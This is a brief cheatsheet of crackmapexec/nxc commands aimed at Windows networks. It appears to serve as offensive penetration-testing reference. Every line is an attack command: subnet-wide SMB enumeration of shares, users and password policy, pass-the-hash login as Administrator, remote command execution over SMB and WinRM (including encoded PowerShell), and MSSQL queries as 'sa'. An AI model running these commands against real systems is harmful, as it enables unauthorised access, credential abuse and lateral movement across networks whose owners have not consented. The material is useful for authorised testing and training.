# crackmapexec / nxc Cheatsheet

```bash
# SMB enumeration
nxc smb 10.10.10.0/24
nxc smb 10.10.10.10 -u user -p pass --shares
nxc smb 10.10.10.10 -u user -p pass --users
nxc smb 10.10.10.10 -u user -p pass --pass-pol

# Pass-the-hash
nxc smb 10.10.10.0/24 -u Administrator -H aadm3b... --local-auth

# Command execution
nxc smb 10.10.10.10 -u user -p pass -x 'whoami'
nxc smb 10.10.10.10 -u user -p pass -X 'powershell -enc ...'

# MSSQL
nxc mssql 10.10.10.10 -u sa -p pass -q 'SELECT @@version'

# WinRM
nxc winrm 10.10.10.10 -u user -p pass -x 'hostname'
```
